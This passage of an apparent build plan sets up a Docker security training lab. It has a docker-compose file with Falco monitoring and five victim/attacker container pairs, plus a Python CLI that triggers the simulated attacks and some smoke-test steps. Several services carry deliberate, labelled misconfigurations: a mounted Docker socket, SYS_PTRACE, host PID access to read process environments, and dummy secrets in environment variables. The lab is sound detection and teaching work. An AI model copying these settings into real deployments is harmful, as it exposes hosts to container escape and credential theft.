      interval: 10s
      timeout: 5s
      retries: 5

  # ── Falco ────────────────────────────────────────────────────────────
  falco:
    image: falcosecurity/falco-no-driver:latest
    container_name: falco
    privileged: true
    pid: host
    volumes:
      - /proc:/host/proc:ro
      - /boot:/host/boot:ro
      - /lib/modules:/host/lib/modules:ro
      - /usr:/host/usr:ro
      - /etc:/host/etc:ro
      - /var/run/docker.sock:/var/run/docker.sock:ro
      - ./falco/falco.yaml:/etc/falco/falco.yaml:ro
      - ./falco/rules:/etc/falco/rules.d:ro
    networks:
      - escape-net
      - sock-net
      - lateral-net
      - secrets-net
      - authz-net
      - monitoring
    depends_on:
      ai-gateway:
        condition: service_healthy
    restart: unless-stopped

  # ── Scenario 1: Container Escape (CVE-2024-21626) ────────────────────
  victim-escape:
    build: ./victims/escape
    container_name: victim-escape
    networks:
      - escape-net
    labels:
      scenario: "container-escape"
      role: "victim"

  attacker-escape:
    build: ./attackers/escape
    container_name: attacker-escape
    networks:
      - escape-net
    labels:
      scenario: "container-escape"
      role: "attacker"
    ports:
      - "5001:5000"
    depends_on:
      - victim-escape

  # ── Scenario 2: Docker Socket Abuse ──────────────────────────────────
  victim-sock:
    build: ./victims/sock
    container_name: victim-sock
    networks:
      - sock-net
    labels:
      scenario: "docker-socket-abuse"
      role: "victim"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # intentional misconfiguration

  attacker-sock:
    build: ./attackers/sock
    container_name: attacker-sock
    networks:
      - sock-net
    labels:
      scenario: "docker-socket-abuse"
      role: "attacker"
    ports:
      - "5002:5000"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    depends_on:
      - victim-sock

  # ── Scenario 3: Lateral Movement ─────────────────────────────────────
  victim-lat-a:
    build: ./victims/lateral-a
    container_name: victim-lat-a
    networks:
      - lateral-net
    labels:
      scenario: "lateral-movement"
      role: "victim-a"

  victim-lat-b:
    build: ./victims/lateral-b
    container_name: victim-lat-b
    networks:
      - lateral-net
    labels:
      scenario: "lateral-movement"
      role: "victim-b"

  attacker-lateral:
    build: ./attackers/lateral
    container_name: attacker-lateral
    networks:
      - lateral-net
    labels:
      scenario: "lateral-movement"
      role: "attacker"
    ports:
      - "5003:5000"
    cap_add:
      - NET_ADMIN
      - SYS_PTRACE            # intentional misconfiguration — enables nsenter
    depends_on:
      - victim-lat-a
      - victim-lat-b

  # ── Scenario 4: Sensitive File Access ────────────────────────────────
  victim-secrets:
    build: ./victims/secrets
    container_name: victim-secrets
    networks:
      - secrets-net
    labels:
      scenario: "sensitive-file-access"
      role: "victim"
    environment:
      - DATABASE_PASSWORD=super_secret_db_pass_2024
      - API_KEY=sk-prod-very-secret-key-do-not-share
      - JWT_SECRET=jwt_signing_secret_weak

  attacker-secrets:
    build: ./attackers/secrets
    container_name: attacker-secrets
    networks:
      - secrets-net
    labels:
      scenario: "sensitive-file-access"
      role: "attacker"
    ports:
      - "5004:5000"
    pid: host                  # intentional: allows /proc/*/environ access
    depends_on:
      - victim-secrets

  # ── Scenario 5: AuthZ Bypass (CVE-2026-34040) ────────────────────────
  victim-authz:
    build: ./victims/authz
    container_name: victim-authz
    networks:
      - authz-net
    labels:
      scenario: "authz-bypass"
      role: "victim"

  attacker-authz:
    build: ./attackers/authz
    container_name: attacker-authz
    networks:
      - authz-net
    labels:
      scenario: "authz-bypass"
      role: "attacker"
    ports:
      - "5005:5000"
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock  # needs socket to craft oversized request
    depends_on:
      - victim-authz
```

- [ ] **Step 2: Validate compose syntax**

```bash
cd /home/shreyas/Desktop/docker_simulation
docker compose config --quiet
```

Expected: no errors, exits 0.

- [ ] **Step 3: Commit**

```bash
git add docker-compose.yml
git commit -m "feat: add docker-compose.yml with 5 isolated attack networks and all services"
```

---

## Task 8: trigger.py CLI + Smoke Test

**Files:**
- Create: `trigger.py`

- [ ] **Step 1: Create `trigger.py`**

```python
#!/usr/bin/env python3
"""
trigger.py — Manual attack trigger for Docker Security Simulation Lab

Usage:
    python trigger.py --attack escape
    python trigger.py --attack sock
    python trigger.py --attack lateral
    python trigger.py --attack secrets
    python trigger.py --attack authz
    python trigger.py --attack all        # fires all with 10s gaps
    python trigger.py --health            # check all attackers are ready
"""
import argparse
import sys
import time

try:
    import requests
except ImportError:
    print("Install requests: pip install requests")
    sys.exit(1)

ATTACKERS: dict[str, str] = {
    "escape":  "http://localhost:5001",
    "sock":    "http://localhost:5002",
    "lateral": "http://localhost:5003",
    "secrets": "http://localhost:5004",
    "authz":   "http://localhost:5005",
}

COLORS = {
    "escape":  "\033[91m",  # red
    "sock":    "\033[93m",  # yellow
    "lateral": "\033[94m",  # blue
    "secrets": "\033[95m",  # magenta
    "authz":   "\033[96m",  # cyan
}
RESET = "\033[0m"


def _color(name: str, text: str) -> str:
    return f"{COLORS.get(name, '')}{text}{RESET}"


def check_health(name: str) -> bool:
    url = f"{ATTACKERS[name]}/health"
    try:
        resp = requests.get(url, timeout=3)
        data = resp.json()
        print(_color(name, f"[{name}] {data.get('status', 'unknown')} — {data.get('scenario', '')}"))
        return resp.status_code == 200
    except requests.RequestException as e:
        print(_color(name, f"[{name}] UNREACHABLE: {e}"))
        return False


def trigger(name: str) -> bool:
    url = f"{ATTACKERS[name]}/trigger"
    print(_color(name, f"\n[*] Triggering {name} attacker → {url}"))
    try:
        resp = requests.post(url, timeout=5)
        resp.raise_for_status()
        data = resp.json()
        print(_color(name, f"[+] {name}: {data}"))
        print(_color(name, f"[*] Watch Falco + AI gateway output for '{data.get('scenario', name)}' alerts"))
        return True
    except requests.RequestException as e:
        print(_color(name, f"[-] Failed to trigger {name}: {e}"))
        return False


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Docker Security Simulation Lab — Attack Trigger",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--attack", choices=[*ATTACKERS, "all"], help="Which attack to trigger")
    group.add_argument("--health", action="store_true", help="Check all attackers are healthy")
    args = parser.parse_args()

    if args.health:
        all_ok = all(check_health(name) for name in ATTACKERS)
        sys.exit(0 if all_ok else 1)

    if args.attack == "all":
        for name in ATTACKERS:
            trigger(name)
            if name != list(ATTACKERS)[-1]:
                print(f"\n[*] Waiting 10s before next attack...")
                time.sleep(10)
    else:
        trigger(args.attack)


if __name__ == "__main__":
    main()
```

- [ ] **Step 2: Make executable**

```bash
chmod +x /home/shreyas/Desktop/docker_simulation/trigger.py
```

- [ ] **Step 3: Smoke test — start the stack**

```bash
cd /home/shreyas/Desktop/docker_simulation
cp .env.example .env
# Edit .env and set OPENAI_API_KEY before running
docker compose up --build -d
```

Expected: all services start without error. May take 2–3 minutes for first build.

- [ ] **Step 4: Verify all attackers are healthy**

```bash
cd /home/shreyas/Desktop/docker_simulation
sleep 15   # wait for containers to initialize
python trigger.py --health
```

Expected output (all green):
```
[escape] ready — container-escape-CVE-2024-21626
[sock] ready — docker-socket-abuse
[lateral] ready — lateral-movement
[secrets] ready — sensitive-file-access
[authz] ready — authz-bypass-CVE-2026-34040
```

- [ ] **Step 5: Fire first attack and verify AI output**

```bash
python trigger.py --attack escape
```

Then watch AI gateway logs:
```bash
docker logs -f ai-gateway
```

Expected: within 5–10 seconds you see colored output with TRIAGE and ANALYSIS sections for the escape scenario.

- [ ] **Step 6: Final commit**

```bash
cd /home/shreyas/Desktop/docker_simulation
git add trigger.py .env.example
git commit -m "feat: add trigger.py CLI and complete smoke test — multi-attacker lab ready"
```

---

## Parallel Execution Map

| Agent | Tasks | Est. Time |
|-------|-------|-----------|
| Agent A | Task 1 + Task 2 (scaffold + AI gateway) | ~10 min |
| Agent B | Task 3 (Falco config) | ~5 min |
| Agent C | Task 4 (escape pair) | ~5 min |
| Agent D | Task 5 (sock pair) | ~5 min |
| Agent E | Task 6a (lateral pair) | ~5 min |
| Agent F | Task 6b (secrets pair) | ~5 min |
| Agent G | Task 6c (authz pair) | ~5 min |
| Main | Task 7 + Task 8 (compose + trigger, after all above) | ~10 min |
